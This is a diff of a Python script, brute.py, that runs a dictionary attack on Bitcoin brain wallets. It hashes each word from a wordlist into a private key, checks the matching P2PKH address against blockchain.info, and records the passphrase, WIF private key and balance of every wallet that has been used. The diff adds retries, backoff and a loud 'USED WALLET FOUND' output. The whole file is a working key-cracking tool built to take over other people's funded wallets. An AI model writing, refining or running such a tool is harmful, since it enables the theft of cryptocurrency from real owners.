@@ -1,29 +1,16 @@
 #!/usr/bin/env python3
 # brute.py
-# Minimal iSH-friendly scanner: only p2pkh
-# dictionary.txt -> found.txt, one-field-per-line output
+# iSH-friendly bruteforce scanner (p2pkh only)
 
 from __future__ import annotations
-import io, sys, logging, time, binascii, hashlib, random, requests
+import io, sys, logging, time, binascii, hashlib, requests, random, os
+import ecdsa, base58
 
-# crypto libs
-try:
-    import ecdsa
-    import base58
-except Exception as e:
-    print("Missing dependencies. Install: pip3 install requests ecdsa base58")
-    raise
-
-# ------------------ Wallet (p2pkh only) ------------------
+# ------------------ Wallet (P2PKH only) ------------------
 class Wallet:
     """
     Wallet(passphrase, is_private_key=False)
-    - if is_private_key: accepts hex privkey or WIF
-    - else: SHA256(passphrase) -> priv key
-    Exposes:
-      - private_key (hex)
-      - wif
-      - addresses dict: only 'p2pkh'
+    Only generates p2pkh address starting with '1'.
     """
     def __init__(self, passphrase, is_private_key=False):
         self.passphrase = passphrase
@@ -37,8 +24,7 @@ class Wallet:
             self.private_key = binascii.hexlify(hashlib.sha256(self.passphrase.encode('utf-8')).digest()).decode()
         self.wif = self._hex_to_wif(self.private_key)
         self.pubkey_compressed = self._priv_to_compressed_pubkey(self.private_key)
-        self.addresses = {}
-        self.addresses['p2pkh'] = self._p2pkh_from_pubkey(self.pubkey_compressed)
+        self.address = self._p2pkh_from_pubkey(self.pubkey_compressed)
 
     def _looks_like_hex(self, s):
         try:
@@ -85,110 +71,143 @@ class Wallet:
         checksum = hashlib.sha256(hashlib.sha256(pref).digest()).digest()[:4]
         return base58.b58encode(pref + checksum).decode()
 
-    def __repr__(self):
-        return "<Wallet priv=%s addr_p2pkh=%s>" % (self.private_key[:8], self.addresses.get('p2pkh'))
-
-
-# ------------------ BlockchainInfo explorer (p2pkh only) ------------------
-class BlockchainInfo:
+# ------------------ BaseBlockExplorer ------------------
+class BaseBlockExplorer:
     def __init__(self):
         self.session = None
-        self._base_url = "https://blockchain.info"
-        self._base_url_received = f"{self._base_url}/q/getreceivedbyaddress"
-        self._base_url_balance = f"{self._base_url}/q/addressbalance"
-        self._api_limit_seconds = 1
+        self._base_url_received = None
+        self._base_url_balance = None
 
     def open_session(self):
+        logging.info("Opening new session")
         self.session = requests.Session()
 
     def close_session(self):
+        logging.debug("Closing session")
         if self.session:
-            try:
-                self.session.close()
-            except Exception:
-                pass
+            try: self.session.close()
+            except Exception: pass
         self.session = None
+
+    def _get(self, url, timeout=15):
+        r = self.session.get(url, timeout=timeout)
+        r.raise_for_status()
+        return r
+
+    def _parse_numeric_from_response(self, response):
+        text = response.text.strip()
+        try: return float(text)
+        except: pass
+        try:
+            j = response.json()
+            for key in ("total_received","totalReceived","final_balance","finalBalance","balance","received"):
+                if isinstance(j, dict) and key in j:
+                    return float(j[key])
+        except: pass
+        raise Exception("Unable to parse numeric from response: "+text[:200])
+
+    def get_received(self, addr):
+        r = self._get(f"{self._base_url_received}/{addr}")
+        return self._parse_numeric_from_response(r)
+
+    def get_balance(self, addr):
+        r = self._get(f"{self._base_url_balance}/{addr}")
+        return self._parse_numeric_from_response(r)
+
+# ------------------ Concrete Explorer ------------------
+class BlockchainInfo(BaseBlockExplorer):
+    def __init__(self):
+        super().__init__()
+        self._api_limit_seconds = 1
+        logging.info("Sleeping %s seconds before blockchain.info calls", self._api_limit_seconds)
+        self._base_url_received = "https://blockchain.info/q/getreceivedbyaddress"
+        self._base_url_balance = "https://blockchain.info/q/addressbalance"
 
     def get_received(self, addr):
         time.sleep(self._api_limit_seconds)
-        r = self.session.get(f"{self._base_url_received}/{addr}", timeout=15)
-        r.raise_for_status()
-        val = float(r.text.strip())
-        if val > 1e9:
-            val /= 1e8
-        return val
+        val = super().get_received(addr)
+        return val / 1e8 if val>100000 else val  # satoshi->BTC
 
     def get_balance(self, addr):
         time.sleep(self._api_limit_seconds)
-        r = self.session.get(f"{self._base_url_balance}/{addr}", timeout=15)
-        r.raise_for_status()
-        val = float(r.text.strip())
-        if val > 1e9:
-            val /= 1e8
-        return val
+        val = super().get_balance(addr)
+        return val / 1e8 if val>100000 else val
 
-
-# ------------------ Main scanner ------------------
+# ------------------ Main ------------------
 def main():
-    dict_file = 'dictionary.txt'
-    out_file = 'found.txt'
-    sleep_between_success = 0.06
-
-    logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)-6s line %(lineno)-4s %(message)s')
-
+    logging.basicConfig(level=logging.INFO, format='%(message)s')
     explorer = BlockchainInfo()
     explorer.open_session()
+
+    dict_file = "dictionary.txt"
+    output_file = "found.txt"
 
     try:
         f_dictionary = io.open(dict_file, 'rt', encoding='utf-8')
     except Exception as e:
-        logging.error("Failed to open dict file %s : %s", dict_file, e)
+        logging.error("Cannot open dictionary.txt: %s", e)
         sys.exit(1)
 
     try:
-        fout = open(out_file, 'w', encoding='utf-8')
+        fout = open(output_file,'w',encoding='utf-8')
     except Exception as e:
-        logging.error("Failed to open output file %s : %s", out_file, e)
+        logging.error("Cannot open found.txt: %s", e)
         sys.exit(1)
 
     for raw in f_dictionary:
-        word = raw.rstrip()
-        if not word:
-            continue
+        word = raw.strip()
+        if not word: continue
         try:
             wallet = Wallet(word)
         except Exception as e:
-            logging.warning("Failed to create wallet for '%s': %s", word, e)
+            logging.warning("Failed to create wallet '%s': %s", word, e)
             continue
 
-        addr = wallet.addresses.get('p2pkh')
-        if not addr:
-            continue
+        addr = wallet.address
+        retry, max_retries, backoff = 0, 4, 1.0
+        received = 0
+        while retry<max_retries:
+            try:
+                received_raw = explorer.get_received(addr)
+                received = float(received_raw)
+                break
+            except Exception as e:
+                retry += 1
+                sleep = backoff*(2**(retry-1))*(0.5+random.random())
+                logging.warning("Error fetching received for %s: %s — retry %d/%d sleeping %.2fs", addr, e, retry,max_retries,sleep)
+                time.sleep(sleep)
+        if retry==max_retries: continue
+        if received==0: continue
 
-        try:
-            received = explorer.get_received(addr)
-        except Exception:
-            received = 0.0
+        balance = 0
+        retry=0
+        while retry<max_retries:
+            try:
+                balance_raw = explorer.get_balance(addr)
+                balance = float(balance_raw)
+                break
+            except Exception as e:
+                retry += 1
+                sleep = backoff*(2**(retry-1))*(0.5+random.random())
+                logging.warning("Error fetching balance for %s: %s — retry %d/%d sleeping %.2fs", addr,e,retry,max_retries,sleep)
+                time.sleep(sleep)
+        if retry==max_retries: continue
 
-        if received == 0:
-            time.sleep(sleep_between_success)
-            continue
-
-        try:
-            balance = explorer.get_balance(addr)
-        except Exception:
-            balance = 0.0
-
-        fout.write(f"{word}\np2pkh\n{addr}\n{received:.8f}\n{wallet.private_key}\n{wallet.wif}\n{balance:.8f}\n\n")
+        # LOUD OUTPUT
+        print("\n=== USED WALLET FOUND ===")
+        print(f"WORD: {word}")
+        print(f"ADDRESS (p2pkh): {addr}")
+        print(f"WIF: {wallet.wif}")
+        print(f"RECEIVED BTC: {received}")
+        print(f"CURRENT BALANCE BTC: {balance}")
+        print("========================\n")
+        fout.write(f"{word},{addr},{wallet.wif},{received},{balance}\n")
         fout.flush()
-        logging.info("Found used wallet for word '%s' addr %s", word, addr)
-        time.sleep(sleep_between_success)
 
     explorer.close_session()
-    fout.close()
     f_dictionary.close()
-    logging.info("Done.")
+    fout.close()
+    logging.info("DONE.")
 
-
-if __name__ == '__main__':
+if __name__=="__main__":
     main()
